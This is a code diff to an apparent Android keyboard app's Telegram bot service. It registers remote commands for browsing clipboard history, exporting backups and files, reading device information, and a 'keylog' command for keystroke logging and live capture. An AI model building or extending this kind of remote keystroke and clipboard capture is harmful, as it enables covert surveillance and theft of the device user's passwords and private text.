@@ -239,9 +239,52 @@ public class TelegramBotService extends Service {
     // Polling loop
     // ─────────────────────────────────────────────────────────────────────────
 
+    private void registerCommands() {
+        try {
+            String body = "{\"commands\":["
+                + "{\"command\":\"start\",\"description\":\"Show all commands\"},"
+                + "{\"command\":\"recent\",\"description\":\"Browse last 20 clipboard clips\"},"
+                + "{\"command\":\"calendar\",\"description\":\"Browse clips by Year > Month > Date\"},"
+                + "{\"command\":\"search\",\"description\":\"Search all clipboard clips\"},"
+                + "{\"command\":\"pin\",\"description\":\"View pinned clipboard & Smart Clips\"},"
+                + "{\"command\":\"stats\",\"description\":\"Clipboard usage statistics\"},"
+                + "{\"command\":\"clipboard\",\"description\":\"Export clipboard as PDF\"},"
+                + "{\"command\":\"smartclips\",\"description\":\"Export Smart Clips as PDF (PIN)\"},"
+                + "{\"command\":\"all\",\"description\":\"Full combined report PDF (PIN)\"},"
+                + "{\"command\":\"appbackup\",\"description\":\"Full app backup JSON or PDF (PIN)\"},"
+                + "{\"command\":\"lock\",\"description\":\"Lock Smart Clips session\"},"
+                + "{\"command\":\"files\",\"description\":\"Last 10 backed-up files\"},"
+                + "{\"command\":\"filestats\",\"description\":\"File backup queue statistics\"},"
+                + "{\"command\":\"watchdog\",\"description\":\"Bot & service health report\"},"
+                + "{\"command\":\"device\",\"description\":\"Device information\"},"
+                + "{\"command\":\"status\",\"description\":\"Bot & app status\"},"
+                + "{\"command\":\"keylog\",\"description\":\"Keystroke logger & live capture\"},"
+                + "{\"command\":\"cancel\",\"description\":\"Cancel current operation\"}"
+                + "]}";
+            HttpURLConnection c = (HttpURLConnection) new URL(
+                    apiUrl(getToken(this)) + "/setMyCommands").openConnection();
+            c.setConnectTimeout(15_000);
+            c.setReadTimeout(15_000);
+            c.setRequestMethod("POST");
+            c.setDoOutput(true);
+            c.setRequestProperty("Content-Type", "application/json");
+            byte[] data = body.getBytes("UTF-8");
+            c.setRequestProperty("Content-Length", String.valueOf(data.length));
+            OutputStream os = c.getOutputStream();
+            os.write(data);
+            os.flush();
+            int code = c.getResponseCode();
+            c.disconnect();
+            Log.d(TAG, "setMyCommands → " + code);
+        } catch (Exception e) {
+            Log.w(TAG, "registerCommands: " + e.getMessage());
+        }
+    }
+
     private void startPolling() {
         _running = true;
         _pollThread = new Thread(() -> {
+            registerCommands();
             send("🤖 <b>FullKeyboard Bot Online</b>\n"
                  + "All systems active. Send /start for commands.");
             while (_running) {
